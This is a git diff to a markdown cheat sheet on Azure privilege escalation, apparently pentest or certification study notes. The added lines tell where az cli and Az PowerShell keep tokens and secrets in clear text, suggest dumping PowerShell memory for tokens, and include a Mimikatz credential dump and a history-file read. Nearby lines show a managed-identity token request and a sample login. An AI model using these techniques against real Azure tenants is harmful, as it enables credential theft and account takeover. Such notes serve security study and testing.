@@ -1,5 +1,15 @@
 # Privilege escalation
 - These seperate commando's aren't complete. Have to go through all authenticated enumeration commands for quick wins!
+
+* [Privesc enumeration](#Privesc-enumeration)
+* [Automation account](#Automation-account)
+* [Command execution on a VM](#Command-execution-on-a-VM)
+* [](#)
+* [](#)
+* [](#)
+* [](#)
+* [](#)
+
 ## Privesc enumeration
 #### List all owned objects
 ```
@@ -145,7 +155,23 @@ cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLin
 cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-## Keyvault
+## Getting credentials
+### Stealing tokens
+#### Stealing tokens from az cli
+- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
+- We can read tokens from the file, use them and request new ones too!
+- azureProfile.json in the same directory contains information about subscriptions. 
+- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
+- To clear the access tokens, always use az logout
+
+#### Stealing tokens from az powershell
+- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
+- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
+- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
+- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
+- Always use Disconnect-AzAccount!!
+
+### Keyvault
 #### Get keyvault access token
 ```
 curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
@@ -185,6 +211,16 @@ $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
 
 Connect-AzAccount -Credential $creds
+```
+
+### Mimikatz
+```
+Invoke-Mimikayz -Dumpcreds
+```
+
+### Powershell History
+```
+type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ## Reset password
